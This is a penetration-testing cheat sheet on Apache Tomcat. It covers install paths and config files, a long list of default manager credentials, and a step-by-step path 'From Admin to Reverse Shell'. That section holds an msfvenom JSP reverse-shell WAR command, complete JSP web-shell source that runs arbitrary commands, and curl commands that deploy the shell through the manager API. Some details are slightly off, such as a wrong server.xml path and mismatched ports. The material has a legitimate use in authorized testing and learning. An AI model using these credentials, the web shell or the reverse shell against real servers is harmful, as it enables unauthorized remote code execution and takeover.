---
description: Tomcat is a web service commonly open in port 8080/tcp.
---

# Tomcat

## Introduction

Apache Tomcat is a free and open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.

## Installation Directory

Depending the version installed or if its installed manually or using `apt`, it would be located in different places.

```text
/opt/tomcat/
/opt/tomcat7/
/opt/tomcat9/
/usr/share/tomcat/
/usr/share/tomcat7/
/usr/share/tomcat9/
```

## Configuration Files

There are serveral important files to look into and take info about the server.

### server.xml

The server.xml file is Tomcat's main configuration file, and is responsible for specifying Tomcat's initial configuration on startup as well as defining the way and order in which Tomcat boots and builds. The elements of the server.xml file belong to five basic categories - Top Level Elements, Connectors, Containers, Nested Components, and Global Settings.

```text
TOMCAT-HOME/conf/web.xml
```

### web.xml

 The web.xml file is derived from the [Servlet](https://www.mulesoft.com/tomcat-servlet) specification, and contains information used to [deploy](https://www.mulesoft.com/tomcat-deploy) and configure the components of your web applications.

```text
TOMCAT-HOME/conf/web.xml
```

### tomcat-users.xml

This last file contains the credentials and privileges of the tomcat users.

```text
TOMCAT-HOME/etc/tomcat-users.xml
```

## Default credentials

SecLists have a list of default credentials in Tomcat:

```text
admin:
admin:admanager
admin:admin
admin:admin
ADMIN:ADMIN
admin:adrole1
admin:adroot
admin:ads3cret
admin:adtomcat
admin:advagrant
admin:password
admin:password1
admin:Password1
admin:tomcat
admin:vagrant
both:admanager
both:admin
both:adrole1
both:adroot
both:ads3cret
both:adtomcat
both:advagrant
both:tomcat
cxsdk:kdsxc
j2deployer:j2deployer
manager:admanager
manager:admin
manager:adrole1
manager:adroot
manager:ads3cret
manager:adtomcat
manager:advagrant
manager:manager
ovwebusr:OvW*busr1
QCC:QLogic66
role1:admanager
role1:admin
role1:adrole1
role1:adroot
role1:ads3cret
role1:adtomcat
role1:advagrant
role1:role1
role1:tomcat
role:changethis
root:admanager
root:admin
root:adrole1
root:adroot
root:ads3cret
root:adtomcat
root:advagrant
root:changethis
root:owaspbwa
root:password
root:password1
root:Password1
root:r00t
root:root
root:toor
tomcat:
tomcat:admanager
tomcat:admin
tomcat:admin
tomcat:adrole1
tomcat:adroot
tomcat:ads3cret
tomcat:adtomcat
tomcat:advagrant
tomcat:changethis
tomcat:password
tomcat:password1
tomcat:s3cret
tomcat:s3cret
tomcat:tomcat
xampp:xampp
server_admin:owaspbwa
admin:owaspbwa
demo:demo
```

## From Admin to Reverse Shell

If you have access to the Tomcat Web Application Manager, you are able to upload and deploy a malicious `.war` file.

### Finding the endpoint

First is important to find the endpoint.

```text
/manager/text/list
/manager/list

curl -u tomcat:'password' http://localhost:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
```

### Creating a shell \(.WAR\)

There are serveral ways to create the war.

#### MSFVenom Reverse Shell

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip-addr> LPORT=<port> -f war -o revshell.war
```

#### Manual Web Shell

Create a index.jsp with the following content:

```text
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>

```

And run the following commands:

```text
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war * 
webshell.war is created
```

### Uploading the shell

We just need to upload it and visit the path.

```text
curl --upload-file webshell.war -u tomcat:'$3cureP4s5w0rd123!' http://localhost:8001/manager/text/deploy?path=/shell
OK - Deployed application at context path [/shell]
```

Finally we can visit the path:

```text
http://locahost:8080/shell
```

## References

* [https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat\#post](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#post)
* [https://www.youtube.com/watch?v=yTHtLi9YZ2s](https://www.youtube.com/watch?v=yTHtLi9YZ2s)

